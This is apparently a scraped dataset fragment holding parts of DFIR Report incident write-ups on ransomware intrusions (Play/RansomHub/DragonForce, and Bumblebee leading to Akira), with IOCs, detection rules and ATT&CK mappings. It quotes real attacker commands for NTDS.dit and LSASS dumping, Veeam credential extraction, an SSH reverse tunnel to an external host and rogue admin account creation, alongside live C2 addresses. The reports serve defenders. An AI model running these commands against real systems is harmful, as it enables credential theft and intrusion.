C:\\Windows\\SysWOW64\\rundll32.exe The activity exposed the client names of the computers used by the threat actor. During the intrusion, the following client names were observed: DESKTOP-A1HRTMJ, DESKTOP-PGD76HT, DESCTOP-QPITRY (sic) and WIN-FLGU1CC210K Betruger On the fifth day of intrusion, we observed that the SectopRAT process created a new binary, ccs.exe. This particular binary has been identified as Betruger, a multi-function backdoor which appears to have been explicitly developed for carrying out ransomware attacks. This custom backdoor has been seen used by affiliates of RansomHub. Once executed, it will reach out to its command and control infrastructure, which was 504e1c95.host.njalla[.]net . Based on OSINT, the 504ec1c95.host.njalla[.]net has been classified as a phishing domain. Based on Symantec\u2019s analysis , the file was identified as the Betruger malware, a multi-functional backdoor. The malware established command and control (C2) communication over multiple IP addresses using ports 80 and 443. Exfiltration On day two of the intrusion, the threat actor began preparing for data exfiltration on the file server. The threat actor conducted systematic data archiving as part of their data staging phase before the main data exfiltration activities, as described in the Collection section of this report. Immediately after, the threat actors initiated outbound network traffic to the IP address 144.202.61.209 using WinsCP via File Transfer Protocol (FTP), efficiently exfiltrating the staged files for approximately 15 minutes. Due to the threat actor\u2019s use of the unencrypted FTP protocol rather than SFTP for data exfiltration, packet capture analysis from the file server revealed compromising evidence of the threat actor\u2019s activities in clear text, including their credentials. Based on the Wireshark capture below, the threat actor connected to an FTP server and began uploading the RAR files they created during data staging, starting with \u201cMDTM **** IT.part1.rar\u201d. The session shows them navigating directories using standard FTP commands (PWD, CWD) and switching between ASCII and binary transfer modes for optimal file transmission. The capture reveals systematic exfiltration of archived organizational data, including attempts to upload \u201cFinance.rar\u201d and other sensitive files they had previously compressed. Impact While no ransomware was deployed before the adversary was evicted from the environment, the threat actor ultimately achieved one of their primary objectives, successfully exfiltrating data from the network. Based on the actions performed by the adversary during this intrusion and the tactics, techniques, and procedures (TTPs) observed throughout the campaign, we assess with high confidence that this was an active ransomware affiliate likely working with various ransomware-as-a-service (RaaS) providers. Based on the analysis of these intrusion events, we identified multiple indicators linked to three distinct ransomware groups. The detailed attribution matrix is as follows. Observed TTPs Group Category Grixba (GT_Net.exe) Play Malware Binary Grixba (GRB_NET.exe) Play Malware Binary Payload staging under C:\\Users\\Public\\Music directory RansomHub Persistence/Staging Betruger Backdoor (ccs.exe) RansomHub Backdoor Usage of BitsAdmin RansomHub LOLBins REDACTED.xml (Netscan output file from another victim) DragonForce Discovery SystemBC (wakewordengine.dll | conhost.dll) Play + DragonForce C2/Proxy Mlaware Impacket (wmiexec) Play + RansomHub Lateral Movement / Credential AccessP NetScan, ADFind, WinRAR, WinSCP, PSExec Play + RansomHub + DragonForce Post-Exploitation Tools Timeline Diamond Model Indicators Atomic 45.141.87.55 - MSBuild.exe C2 (SectopRAT) 149.28.101.219 - WakeWordEngine.dll/conhost.dll (SystemBC) 504e1c95.host.njalla[.]net - ccs.exe (Betruger) 80.78.28.149 - ccs.exe (Betruger) 144.202.61.209 - TA's FTP server Computed earthtime.exe 71f703024c3d3bfc409f66bb61f971a0 f24fc14f39c160b54dc3b2fbd1eba605ec0eb04f bcff246f0739ed98f8aa615d256e7e00bc1cb24c8cabaea609b25c3f050c7805 wakewordengine.dll / conhost.dll e963d598a86c5ee428a2eefa34d1ffbb 142294249feb536e0edbe6e2de3eb3c3415ecf39 6f9326224e6047458e692cd27aeb1054b9381c67aaf2fe238dbebfbc916c4b33 ccs.exe (Betruger) 5675a7773f6d3224bfefdc01745f8411 c0e5e4b5fcbd0a30b042e602d99a6ee81ad5d8d7 ae7c31d4547dd293ba3fd3982b715c65d731ee07a9c1cc402234d8705c01dfca fs64.exe c6f92d1801d7d212282a6dd8f11b44fe d15d45d9d9a8ef7a9f048d74b386f620f3b82576 e1521e077079032df974c7ae39e4737cdb4f05c6ded677ed5446167466eeb899 vhd.dll 95c96de7dcb5a643559ac66045559cc9 68b6d0cc1430e2d4f70e2ba5026d1c4847324269 a4bc6bebabb52ed9816987b77ebae6ef70e174533a643aea6265bdf1ed9b8952 gt_net.exe abb2a6a0f771ab20ce2037d2c4ef5783 ac0fcbc148e45e172c9be0acf9c307186f898803 aeaf7cc7364a44b381af9f317fe6f78c2717217800b93bee8839ab3e56233254 grb_net.exe 88df27b6e794e3fd5f93f28b1ca1d3d0 2114d655805f465d11b720830d150c145039bcd4 f8810179ab033a9b79cd7006c1a74fbcde6ed0451c92fbb8c7ce15b52499353a adfind.exe 12011c44955fd6631113f68a99447515 4f4f8cf0f9b47d0ad95d159201fe7e72fbc8448d c92c158d7c37fea795114fa6491fe5f145ad2f8c08776b18ae79db811e8e36a3 sh.exe 829a9dfd2cdcf50519a1cec1f529854b 5bf41754bfb3a18611b2a02f7f385960ed24f8e1 a7240d8a7aee872c08b915a58976a1ddee2ff5a8a679f78ec1c7cf528f40deed netscan.exe 27f7186499bc8d10e51d17d3d6697bc5 52332ce16ee0c393b8eea6e71863ad41e3caeafd 18f0898d595ec054d13b02915fb7d3636f65b8e53c0c66b3c7ee3b6fc37d3566 Detections Network ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity M2 (GET) ET MALWARE Arechclient2 Backdoor/SecTopRAT CnC Init ThreatFox SectopRAT botnet C2 traffic (ip:port - confidence level: 100%) ET MALWARE Arechclient2 Backdoor/SecTopRAT Related Activity ET INFO Suspected Impacket WMIExec Activity Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Private Rules: 85d1ebcc-0145-4033-a344-f9f3a4dd03ac : Sharphound File Writes 932dd739-3672-458e-b362-b3cedba992ba : Grixba Reconnaissance Tool Execution 97350071-6934-4d1e-863d-23b7f51fb17d : SharpHound Active Directory Enumeration Tool Execution Sigma Repo: 17d619c1-e020-4347-957e-1d1207455c93 : Active Directory Replication from Non Machine Account b85e5894-9b19-4d86-8c87-a2f3b81f0521 : BITS Transfer Job Downloading File Potential Suspicious Extension 6d44fb93-e7d2-475c-9d3d-54c9c1e33427 : BITS Transfer Job With Uncommon Or Suspicious Remote TLD 02773bed-83bf-469f-b7ff-e676e7d78bab : BloodHound Collection Files f376c8a7-a2d0-4ddc-aa0c-16c17236d962 : HackTool \u2013 Bloodhound/Sharphound Execution 611eab06-a145-4dfa-a295-3ccc5c20f59a : Mimikatz DC Sync 7b434893-c57d-4f41-908d-6a17bf1ae98f : Network Connection Initiated From Process Located In Potentially Suspicious Or Uncommon Location ed74fe75-7594-4b4b-ae38-e38e3fd2eb23 : Outbound RDP Connections Over Non-Standard Tools cf879ffb-793a-4753-9a14-bc8f37cc90df : Potential Qakbot Rundll32 Execution 3dfd06d2-eaf4-4532-9555-68aca59f57c4 : Process Execution From A Potentially Suspicious Folder 304afd73-55a5-4bb9-8c21-0b1fc84ea9e4 : PSEXEC Remote Execution File Artifact 7c0dcd3d-acf8-4f71-9570-f448b0034f94 : PsExec Service Child Process Execution as LOCAL SYSTEM 9a132afa-654e-11eb-ae93-0242ac130002 : PUA \u2013 AdFind Suspicious Execution b447f7de-1e53-4cbf-bfb4-f1f6d0b04e4e : Suspicious Binaries and Scripts in Public Folder bbb7e38c-0b41-4a11-b306-d2a457b7ac2b : Suspicious File Created In PerfLogs 1277f594-a7d1-4f28-a2d3-73af5cbeab43 : Windows Shell/Scripting Application File Write to Suspicious Folder Yara MALPEDIA_Win_Systembc_Auto DITEKSHEN_MALWARE_Win_EXEPWSH_Dlagent TELEKOM_SECURITY_Win_Systembc_20220311 EXT_MAL_SystemBC_Mar22_1 ELASTIC_Windows_Trojan_Systembc_C1B58C2F SUSP_XORed_URL_In_EXE DITEKSHEN_MALWARE_Win_Arechclient2 ELASTIC_Windows_Trojan_Redlinestealer_15Ee6903 ELASTIC_Windows_Generic_Threat_2Ae9B09E MITRE ATT&CK Additional Local or Domain Groups - T1098.007 Archive via Utility - T1560.001 Automated Collection - T1119 Create Account - T1136 Credentials from Password Stores - T1555 DCSync - T1003.006 Disable or Modify Tools - T1562.001 Domain Account - T1087.002 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Group Policy Discovery - T1615 Lateral Tool Transfer - T1570 Local Account - T1087.001 Local Account - T1136.001 Local Groups - T1069.001 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerading - T1036 MSBuild - T1127.001 Network Service Discovery - T1046 Network Share Discovery - T1135 Obfuscated Files or Information - T1027 PowerShell - T1059.001 Protocol Tunneling - T1572 Proxy - T1090 Registry Run Keys / Startup Folder - T1547.001 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Service Execution - T1569.002 System Network Configuration Discovery - T1016 Timestomp - T1070.006 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Management Instrumentation - T1047 Windows Service - T1543.003 Internal Case #TB32034 #PR37389 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira From a Single Click: How Lunar Spider Enabled a Near Two-Month Intrusion Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 6
  },
  {
    "url": "https://thedfirreport.com/2025/08/05/from-bing-search-to-ransomware-bumblebee-and-adaptixc2-deliver-akira/",
    "title": "From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira \u2013 The DFIR Report",
    "content": "From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts akira Flash Alert ransomware From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira August 5, 2025 Overview Bumblebee malware has been an initial access tool used by threat actors since late 2021. In 2023 the malware was first reported as using SEO poisoning as a delivery mechanism. Recently in May of 2025 Cyjax reported on a campaign using this method again, impersonating various IT tools. We observed a similar campaign in July in which a download of an IT management tool ended with Akira ransomware. In July 2025, we observed a threat actor compromise an organization through this SEO poisoning campaign. A user searching for \u201cManageEngine OpManager\u201d was directed to a malicious website, which delivered a trojanized software installer. This action led to the deployment of the Bumblebee malware, granting the threat actor initial access to the environment. The intrusion quickly escalated from a single infected host to a full-scale network compromise. Following initial access, the threat actor moved laterally to a domain controller, dumped credentials, installed persistent remote access tools, and exfiltrated data using an SFTP client. The intrusion culminated in the deployment of Akira ransomware across the root domain. The threat actor returned two days later to repeat the process, encrypting systems within a child domain and causing significant operational disruption across the enterprise. This campaign affected multiple organizations during July as we received confirmation of a similar intrusion responded to by the Swisscom B2B CSIRT in which a malicious IT tool dropped Bumblebee and also ended with Akira ransomware deployment. DFIR Report Services Our customers received notice of this campaign in early July followed by a private threat brief report . If you are interested in the full report or additional IOCs please contact us. Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Intrusion Details This intrusion began when a user, searching for \u201cManageEngine OpManager\u201d on Bing, was directed to the malicious site opmanager[.]pro. The user downloaded a trojanized MSI installer, ManageEngine-OpManager.msi, which, upon execution, installed the legitimate software while simultaneously loading the Bumblebee malware msimg32.dll via consent.exe. The Bumblebee malware established command and control (C2) with 109.205.195[.]211:443 and 188.40.187[.]145:443 using DGA domains. By targeting IT management tools and software in both our intrusion and the one observed by Swisscom B2B CSIRT , the users executing the malware were highly privileged IT administrator accounts within Active Directory. This provided easy privileged access to the threat actors for their next actions. Approximately five hours after this initial execution, Bumblebee deployed an AdaptixC2 beacon (AdgNsy.exe), which established a new C2 channel to 172.96.137[.]160:443. The threat actor then initiated internal reconnaissance using built-in Windows utilities, including systeminfo, nltest /dclist:, whoami /groups, and net group domain admins /dom. Following this, the threat actor then created two new domain accounts, backup_DA and backup_EA, and added the latter to the \u201cEnterprise Administrators\u201d group. Using the privileged backup_EA account, the threat actor connected to a domain controller via RDP and dumped the NTDS.dit file using wbadmin.exe. wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include\":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet For persistence and re-entry, the threat actor installed the RustDesk remote access tool on several hosts. In a subsequent session, the threat actor established a SSH tunnel to an external server at 193.242.184[.]150 to proxy their activity. ssh [email protected] -R *:10400 -p22 They continued discovery by deploying a renamed SoftPerfect network scanner (n.exe). Following this, they targeted a backup server, and attempted to dump credentials from the Veeam PostgreSQL database. psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\" Around the same time, the threat actor installed FileZilla on a file server and exfiltrated data via SFTP to 185.174.100[.]203. They performed LSASS memory dumping on multiple workstations using rundll32.exe with comsvcs.dll using a combination of remote services and WMI. The threat actor then deployed the Akira ransomware payload, locker.exe, and executed it with various command-line options to encrypt local, remote network shares, and other directories on remote hosts. Two days after this first ransomware deployment, the threat actor returned via RustDesk, connected to a child domain controller, and performed another round of discovery using Invoke-ShareFinder and DNS zone export commands, before deploying Akira ransomware to the child domain. Time to the first round of ransomware (TTR) was just shy of 44 hours after initial access. Swisscom B2B CSIRT reported an even faster TTR of just nine hours from initial access. During our investigation of the OpManager site, we identified two additional websites that appear to be distributing trojanized installers for Axis Camera tools and Angry IP Scanner. Refer to the IOC section for further details. Detection Engineering and Threat Hunting (DEATH) Initial Access & Execution Hunt for MSI installations from user directories followed by suspicious child processes : Monitor msiexec.exe executing from user Desktop/Downloads (C:\\Users\\*\\Desktop\\*.msi, C:\\ProgramData\\*.msi) and spawning unexpected children like consent.exe or unusual image load events for msimg32.dll. Review unusual MSI packages with suspicious names : Look for MSI files with generic names like ManageEngine-OpManager.msi or rustdesk-*.msi downloaded to user directories. Is this software generally allowed in you environment? Is this a commonly used remote access tool for your users? Does the software being installed make sense for the users job role? Credential Access Hunt for LSASS memory dumping via comsvcs.dll with tasklist enumeration : cmd.exe /Q /c for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %%B \\Windows\\Temp\\*.* full Detect LSASS dumps with unusual file extensions : Monitor rundll32.exe comsvcs.dll #+000024 writing to \\Windows\\Temp\\ with non-standard extensions like .sys, .docx, .avhdx Monitor PostgreSQL credential extraction from Veeam databases : psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\" Monitor wbadmin abuse for NTDS.dit/Hive dumping : wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet Discovery Hunt for rapid domain enumeration sequences within short time-frames (< 5 minutes): cmd.exe \u251c\u2500\u2500 systeminfo.exe \u251c\u2500\u2500 nltest.exe /dclist: \u251c\u2500\u2500 nltest.exe /domain_trusts \u251c\u2500\u2500 whoami.exe /groups \u251c\u2500\u2500 net.exe group \"domain admins\" /dom \u2514\u2500\u2500 net.exe group \"enterprise admins\" /dom Monitor for DNS zone exports targeting multiple domains : Look for Export-DnsServerZone commands targeting _msdcs.*, and TrustAnchors within the same session Persistence & Privilege Escalation Detect domain user creation followed by immediate privilege escalation via net utility commands : net user backup_EA P@ssw0rd1234 /add /dom net group \"enterprise admins\" backup_EA /add /dom Hunt for backup account creation with predictable naming patterns : Monitor net user backup_* or backup_EA/backup_DA account creation followed by admin group additions Command & Control Monitor for SSH reverse tunneling to external IPs : ssh root@<external_ip> -R *:10400 -p22 Hunt for Bumblebee DGA patterns : Look for multiple DNS queries to domains matching pattern [8-14 random chars].org (e.g., ev2sirbd269o5j[.]org, ijt0l3i8brit6q[.]org) within seconds of each other. Lateral Movement Hunt for RDP logons using newly created accounts : Monitor Type 10 logons from compromised internal systems using accounts like backup_EA Detect suspicious inter-system authentication patterns : Look for authentication from initial access systems to domain controllers within hours of account creation Data Collection & Exfiltration Hunt for FileZilla installation on servers followed by large outbound transfers : Detect FileZilla_*_setup.exe execution on server systems, especially when followed by significant network traffic Look for data staging in ProgramData : Monitor file writes to C:\\ProgramData\\shares.txt, C:\\ProgramData\\*.txt containing reconnaissance output Defense Evasion Detect case variation in command execution : Hunt for mixed-case command invocations like Cmd.eXE, CmD.Exe which may indicate evasion attempts Behavioral Correlation Rules Multi-stage attack progression : Alert when a single system exhibits: MSI installation \u2192 discovery commands \u2192 credential access \u2192 lateral movement within 24 hours Cross-system activity correlation : Hunt for accounts created on one system and immediately used for authentication on another (<= 5mins) Tool deployment patterns : Monitor for remote access tool installation (RustDesk) followed by SSH tunneling activity from the same network segment Indicators of Compromise (IOCs) Domains: ev2sirbd269o5j.org (Bumblebee DGA domain) 2rxyt9urhq0bgj.org (Bumblebee DGA domain) DFIR Report: opmanager[.]pro (Malicious site for trojanized installer) angryipscanner.org (Malicious site for trojanized installer) axiscamerastation.org (Malicious site for trojanized installer) Swisscom B2B CSIRT: ip-scanner[.]org (Malicious site for trojanized installer) IP Addresses: 109.205.195[.]211 (Bumblebee C2) 188.40.187[.]145 (Bumblebee C2) DFIR Report: 172.96.137[.]160 (AdaptixC2 C2) Swisscom B2B CSIRT: 170.130.55[.]223 (AdaptixC2 C2) DFIR Report: 193.242.184[.]150 (SSH Tunnel Host) Swisscom B2B CSIRT: 83.229.17[.]60 (SSH Tunnel Host) 185.174.100[.]203 (SFTP Exfiltration Server) File Hashes: DFIR Report: ManageEngine-OpManager.msi 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da (Malicious installer) Swisscom B2B CSIRT: Advanced-IP-Scanner.msi a14506c6fb92a5af88a6a44d273edafe10d69ee3d85c8b2a7ac458a22edf68d2 (Malicious installer) DFIR Report: msimg32.dll a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331 (Bumblebee) Swisscom B2B CSIRT: msimg32.dll 6ba5d96e52734cbb9246bcc3decf127f780d48fa11587a1a44880c1f04404d23 (Bumblebee) DFIR Report: locker.exe de730d969854c3697fd0e0803826b4222f3a14efe47e4c60ed749fff6edce19d (Akira ransomware) Swisscom B2B CSIRT: win.exe 18b8e6762afd29a09becae283083c74a19fc09db1f2c3412c42f1b0178bc122a (Akira ransomware) #TB36726 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation KongTuke FileFix Leads to New Interlock RAT Variant Blurring the Lines: Intrusion Shows Connection With Three Major Ransomware Gangs Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "filtered_content": "From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira \u2013 The DFIR Report Skip to content Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts The DFIR Report Real Intrusions by Real Attackers, The Truth Behind the Intrusion Menu Reports Analysts Services Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts Access DFIR Labs Subscribe Contact Us Thursday, February 12, 2026 Menu Threat Intelligence Detection Rules DFIR Labs Digital Forensics Challenge Leaderboard Digital Forensics Challenge Winners Testimonials Case Artifacts akira Flash Alert ransomware From Bing Search to Ransomware: Bumblebee and AdaptixC2 Deliver Akira August 5, 2025 Overview Bumblebee malware has been an initial access tool used by threat actors since late 2021. In 2023 the malware was first reported as using SEO poisoning as a delivery mechanism. Recently in May of 2025 Cyjax reported on a campaign using this method again, impersonating various IT tools. We observed a similar campaign in July in which a download of an IT management tool ended with Akira ransomware. In July 2025, we observed a threat actor compromise an organization through this SEO poisoning campaign. A user searching for \u201cManageEngine OpManager\u201d was directed to a malicious website, which delivered a trojanized software installer. This action led to the deployment of the Bumblebee malware, granting the threat actor initial access to the environment. The intrusion quickly escalated from a single infected host to a full-scale network compromise. Following initial access, the threat actor moved laterally to a domain controller, dumped credentials, installed persistent remote access tools, and exfiltrated data using an SFTP client. The intrusion culminated in the deployment of Akira ransomware across the root domain. The threat actor returned two days later to repeat the process, encrypting systems within a child domain and causing significant operational disruption across the enterprise. This campaign affected multiple organizations during July as we received confirmation of a similar intrusion responded to by the Swisscom B2B CSIRT in which a malicious IT tool dropped Bumblebee and also ended with Akira ransomware deployment. DFIR Report Services Our customers received notice of this campaign in early July followed by a private threat brief report . If you are interested in the full report or additional IOCs please contact us. Private Threat Briefs : 20+ private DFIR reports annually. Threat Feed : Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc. All Intel : Includes everything from Private Threat Briefs and Threat Feed, plus private events, Threat Actor Insights reports, long-term tracking, data clustering, and other curated intel. Private Sigma Ruleset : Features 170+ Sigma rules derived from 50+ cases, mapped to ATT&CK with test examples. DFIR Labs : Offers cloud-based, hands-on learning experiences, using real data, from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds. Contact us today for pricing or a demo! Intrusion Details This intrusion began when a user, searching for \u201cManageEngine OpManager\u201d on Bing, was directed to the malicious site opmanager[.]pro. The user downloaded a trojanized MSI installer, ManageEngine-OpManager.msi, which, upon execution, installed the legitimate software while simultaneously loading the Bumblebee malware msimg32.dll via consent.exe. The Bumblebee malware established command and control (C2) with 109.205.195[.]211:443 and 188.40.187[.]145:443 using DGA domains. By targeting IT management tools and software in both our intrusion and the one observed by Swisscom B2B CSIRT , the users executing the malware were highly privileged IT administrator accounts within Active Directory. This provided easy privileged access to the threat actors for their next actions. Approximately five hours after this initial execution, Bumblebee deployed an AdaptixC2 beacon (AdgNsy.exe), which established a new C2 channel to 172.96.137[.]160:443. The threat actor then initiated internal reconnaissance using built-in Windows utilities, including systeminfo, nltest /dclist:, whoami /groups, and net group domain admins /dom. Following this, the threat actor then created two new domain accounts, backup_DA and backup_EA, and added the latter to the \u201cEnterprise Administrators\u201d group. Using the privileged backup_EA account, the threat actor connected to a domain controller via RDP and dumped the NTDS.dit file using wbadmin.exe. wbadmin.exe start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include\":C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet For persistence and re-entry, the threat actor installed the RustDesk remote access tool on several hosts. In a subsequent session, the threat actor established a SSH tunnel to an external server at 193.242.184[.]150 to proxy their activity. ssh [email protected] -R *:10400 -p22 They continued discovery by deploying a renamed SoftPerfect network scanner (n.exe). Following this, they targeted a backup server, and attempted to dump credentials from the Veeam PostgreSQL database. psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\" Around the same time, the threat actor installed FileZilla on a file server and exfiltrated data via SFTP to 185.174.100[.]203. They performed LSASS memory dumping on multiple workstations using rundll32.exe with comsvcs.dll using a combination of remote services and WMI. The threat actor then deployed the Akira ransomware payload, locker.exe, and executed it with various command-line options to encrypt local, remote network shares, and other directories on remote hosts. Two days after this first ransomware deployment, the threat actor returned via RustDesk, connected to a child domain controller, and performed another round of discovery using Invoke-ShareFinder and DNS zone export commands, before deploying Akira ransomware to the child domain. Time to the first round of ransomware (TTR) was just shy of 44 hours after initial access. Swisscom B2B CSIRT reported an even faster TTR of just nine hours from initial access. During our investigation of the OpManager site, we identified two additional websites that appear to be distributing trojanized installers for Axis Camera tools and Angry IP Scanner. Refer to the IOC section for further details. Detection Engineering and Threat Hunting (DEATH) Initial Access & Execution Hunt for MSI installations from user directories followed by suspicious child processes : Monitor msiexec.exe executing from user Desktop/Downloads (C:\\Users\\*\\Desktop\\*.msi, C:\\ProgramData\\*.msi) and spawning unexpected children like consent.exe or unusual image load events for msimg32.dll. Review unusual MSI packages with suspicious names : Look for MSI files with generic names like ManageEngine-OpManager.msi or rustdesk-*.msi downloaded to user directories. Is this software generally allowed in you environment? Is this a commonly used remote access tool for your users? Does the software being installed make sense for the users job role? Credential Access Hunt for LSASS memory dumping via comsvcs.dll with tasklist enumeration : cmd.exe /Q /c for /f \"tokens=1,2 delims= \" %%A in ('\"tasklist /fi \"Imagename eq lsass.exe\" | find \"lsass\"\"') do rundll32.exe C:\\windows\\System32\\comsvcs.dll, #+000024 %%B \\Windows\\Temp\\*.* full Detect LSASS dumps with unusual file extensions : Monitor rundll32.exe comsvcs.dll #+000024 writing to \\Windows\\Temp\\ with non-standard extensions like .sys, .docx, .avhdx Monitor PostgreSQL credential extraction from Veeam databases : psql.exe -U postgres --csv -d VeeamBackup -w -c \"SELECT user_name,password,description,change_time_utc FROM credentials\" Monitor wbadmin abuse for NTDS.dit/Hive dumping : wbadmin start backup -backuptarget:\\\\127.0.0.1\\C$\\ProgramData\\ -include:\"C:\\windows\\NTDS\\ntds.dit,C:\\windows\\system32\\config\\SYSTEM,C:\\windows\\system32\\config\\SECURITY\" -quiet Discovery Hunt for rapid domain enumeration sequences within short time-frames (< 5 minutes): cmd.exe \u251c\u2500\u2500 systeminfo.exe \u251c\u2500\u2500 nltest.exe /dclist: \u251c\u2500\u2500 nltest.exe /domain_trusts \u251c\u2500\u2500 whoami.exe /groups \u251c\u2500\u2500 net.exe group \"domain admins\" /dom \u2514\u2500\u2500 net.exe group \"enterprise admins\" /dom Monitor for DNS zone exports targeting multiple domains : Look for Export-DnsServerZone commands targeting _msdcs.*, and TrustAnchors within the same session Persistence & Privilege Escalation Detect domain user creation followed by immediate privilege escalation via net utility commands : net user backup_EA P@ssw0rd1234 /add /dom net group \"enterprise admins\" backup_EA /add /dom Hunt for backup account creation with predictable naming patterns : Monitor net user backup_* or backup_EA/backup_DA account creation followed by admin group additions Command & Control Monitor for SSH reverse tunneling to external IPs : ssh root@<external_ip> -R *:10400 -p22 Hunt for Bumblebee DGA patterns : Look for multiple DNS queries to domains matching pattern [8-14 random chars].org (e.g., ev2sirbd269o5j[.]org, ijt0l3i8brit6q[.]org) within seconds of each other. Lateral Movement Hunt for RDP logons using newly created accounts : Monitor Type 10 logons from compromised internal systems using accounts like backup_EA Detect suspicious inter-system authentication patterns : Look for authentication from initial access systems to domain controllers within hours of account creation Data Collection & Exfiltration Hunt for FileZilla installation on servers followed by large outbound transfers : Detect FileZilla_*_setup.exe execution on server systems, especially when followed by significant network traffic Look for data staging in ProgramData : Monitor file writes to C:\\ProgramData\\shares.txt, C:\\ProgramData\\*.txt containing reconnaissance output Defense Evasion Detect case variation in command execution : Hunt for mixed-case command invocations like Cmd.eXE, CmD.Exe which may indicate evasion attempts Behavioral Correlation Rules Multi-stage attack progression : Alert when a single system exhibits: MSI installation \u2192 discovery commands \u2192 credential access \u2192 lateral movement within 24 hours Cross-system activity correlation : Hunt for accounts created on one system and immediately used for authentication on another (<= 5mins) Tool deployment patterns : Monitor for remote access tool installation (RustDesk) followed by SSH tunneling activity from the same network segment Indicators of Compromise (IOCs) Domains: ev2sirbd269o5j.org (Bumblebee DGA domain) 2rxyt9urhq0bgj.org (Bumblebee DGA domain) DFIR Report: opmanager[.]pro (Malicious site for trojanized installer) angryipscanner.org (Malicious site for trojanized installer) axiscamerastation.org (Malicious site for trojanized installer) Swisscom B2B CSIRT: ip-scanner[.]org (Malicious site for trojanized installer) IP Addresses: 109.205.195[.]211 (Bumblebee C2) 188.40.187[.]145 (Bumblebee C2) DFIR Report: 172.96.137[.]160 (AdaptixC2 C2) Swisscom B2B CSIRT: 170.130.55[.]223 (AdaptixC2 C2) DFIR Report: 193.242.184[.]150 (SSH Tunnel Host) Swisscom B2B CSIRT: 83.229.17[.]60 (SSH Tunnel Host) 185.174.100[.]203 (SFTP Exfiltration Server) File Hashes: DFIR Report: ManageEngine-OpManager.msi 186b26df63df3b7334043b47659cba4185c948629d857d47452cc1936f0aa5da (Malicious installer) Swisscom B2B CSIRT: Advanced-IP-Scanner.msi a14506c6fb92a5af88a6a44d273edafe10d69ee3d85c8b2a7ac458a22edf68d2 (Malicious installer) DFIR Report: msimg32.dll a6df0b49a5ef9ffd6513bfe061fb60f6d2941a440038e2de8a7aeb1914945331 (Bumblebee) Swisscom B2B CSIRT: msimg32.dll 